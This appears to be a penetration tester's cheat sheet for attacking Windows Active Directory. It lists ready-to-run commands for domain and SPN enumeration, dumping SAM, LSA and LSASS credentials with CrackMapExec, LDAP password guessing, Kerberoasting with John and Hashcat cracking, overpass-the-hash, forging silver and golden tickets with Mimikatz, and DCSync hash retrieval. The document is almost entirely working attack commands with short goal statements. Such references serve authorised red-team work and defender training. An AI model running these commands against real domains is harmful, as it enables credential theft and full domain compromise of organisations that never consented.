# Active Directory

## Tools

* [https://github.com/byt3bl33d3r/CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
* [https://github.com/mpgn/Rubeus](https://github.com/mpgn/Rubeus)

## Readings

* [https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html](https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
* [https://0xdf.gitlab.io/2020/03/21/htb-forest.html](https://0xdf.gitlab.io/2020/03/21/htb-forest.html)

## Enumeration

### Get current domain

```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

### Enumerate users & groups

#### Using net command

```
net user /domain
net group /domain
```

#### Using Powershell

```
$SearchString = "LDAP://dc01.domain.com/DC=domain,DC=com"
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(samAccountType=805306368)"
$Searcher.FindAll()
```

### Enumerate logged in users

```
# Enumerate logged in users
Import-Module .\PowerView.ps1
Get-NetLoggedon -ComputerName computer
Get-NetSession -ComputerName server
```

### Get password policy

```
net accounts
```

### Enumerate SPNs

#### Using inline Powershell

```
$SearchString = "LDAP://dc01.domain.com/DC=domain,DC=com"
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(serviceprincipalname=*)"
$Searcher.FindAll()
```

#### Using [Get-SPN](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/situational\_awareness/network/Get-SPN.ps1)

```
Import-Module .\Get-SPN.ps1
Get-SPN -type service -search *
```

Using builtins

```
setspn -T <domain> -Q */*
```

### List Accounts with DCSync Permission

```
PS> dsacls.exe "DC=rccad,DC=net" | select-string "replicat"
```

## Passwords & Hashes

### Cached Credentials

* [Mimikatz](../../toolbox/password-attacks/mimikatz.md)
* [CrackMapExec](https://mpgn.gitbook.io/crackmapexec/smb-protocol/obtaining-credentials)

```
crackmapexec smb <ip> -u user -p pass --sam
crackmapexec smb <ip> -u user -p pass --lsa
# ==> can crack with John
# john file.cache -w=/usr/share/wordlists/rockyou.txt --format=mscash2 --external:AutoStatus
crackmapexec smb <ip> -u user -p pass -M lsassy
```

* [https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b](https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials)

### Password Guessing

Try to create a DirectoryEntry object. If the password is correct, the object creation is successful.

```
New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC01.example.com/DC=example,DC=com", "user", "password")
```

## Kerberos

### Request in a new TGS

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'SPN_ADDRESS'
```

### Display cached tickets

```
# Powershell
klist

# Mimikatz
kerberos::list
```

### Retrieve tickets from memory

```
# If created from powershell
Add-Type -AssemblyName System.IdentityModel
$t = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'SPN_ADDRESS'
$t.GetRequest()

# Mimikatz
kerberos::list /export
```

### Kerberoasting

Goal: Retrieve service tickets then attempt to crack them (JTR, Hashcat) to obtain service account password.

#### Using tgsrepcrack.py

```
sudo apt update && sudo apt install kerberoast
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt kerberos_ticket.kirbi
```

#### Using Invoke-Kerberoast into JTR or Hashcat

* [https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/Invoke-Kerberoast.ps1)

```
Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII hashes.lst

# Previous format may be wrong
Invoke-Kerberoast | % { $_.Hash } | % { $_.replace('krb5tgs$', 'krb5tgs$23$*') } | % { $_ -replace "(.*):(.*)", '$1*$$$2' } | % { $_.replace(':', '~') } | Out-file -FilePath .\ha
shes.txt -Encoding utf8
john --format=krb5tgs --wordlist=wordlist.txt hashes.txt

Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.txt
hashcat -m 13100 -a 0 -o cracked.txt hashes.txt wordlist.txt
```

### Overpass-the-Hash

Goal: convert a cached NTLM hash into a Kerberos TGT.

Using Mimikatz \[requires local admin]:

* `sekurlsa::logonpasswords` to show available NTLM hashes
* `sekurlsa::pth` to start a Powershell process in the context of the target user, using his NTLM hash

```
sekurlsa::pth /user:admin /domain:example.com /ntlm:<HASH> /run:PowerShell.exe
```

Inside the new Powershell session:

* Check cached tickets using `klist`
* If no TGT is cached, generate one by triggering an authentication over the domain. Example: authenticating on a network share

```
net use \\dc01
```

* When a TGT is cached, it is possible to use any tool requiring Kerberos authentication. Example: using the official PsExec binary to obtain RCE

```
.\PsExec.exe \\dc01 cmd.exe
```

### Silver ticket

Goal: forge a TGS, using the service account password or NTLM hash, with desired permissions

Using Mimikatz:

```
# Flush existing tickets
kerberos::purge

# Verify the purge
kerberos::list

# Forge the silver ticket
kerberos::golden /user:username /domain:example.com /sid:<domain SID> /target:<server FQDN> /service:<service> /rc4:<service account hash> /ptt
```

* `/user`: username
* `/domain`: domain name
* `/sid`: domain SID.
  * Can be retrieved by checking current user SID: `whoami /user`
* `/target`: server FQDN
* `/service`: service type, like HTTP, MSSQL
* `/rc4`: service NTLM hash.
  * To generate the hash from the password: `kerberos::hash /password:<password>`
* `/ptt`: inject the forged ticket into memory

### Golden ticket

Goal: use `krbtgt` NTLM hash to forge TGT tickets

Using Mimikatz on DC:

```
privilege::debug
lsadump::lsa /patch
```

Forge golden ticket using Mimikatz:

```
# Flush existing tickets
kerberos::purge

# Forge golden ticket
kerberos::golden /user:fakeuser /domain:domain.com /sid:<domain SID> /krbtgt:<krbtgt hash> /ptt
```

* `/user`: username in the TGT
* `/domain`: domain name
* `/sid`: domain SID
* `/krbtgt`: krbtgt NTLM hash
* `/ptt`: inject the forged ticket into memory

Launch a new cmd prompt through Mimikatz to use the forged ticket:

```
misc::cmd
```

### DCSync

Goal: use Directory Replication Service Remote Protocol to retrieve users hashes

Retrieve a specific user hash, using Mimikatz:

```
lsadump::dcsync /user:<username>
```
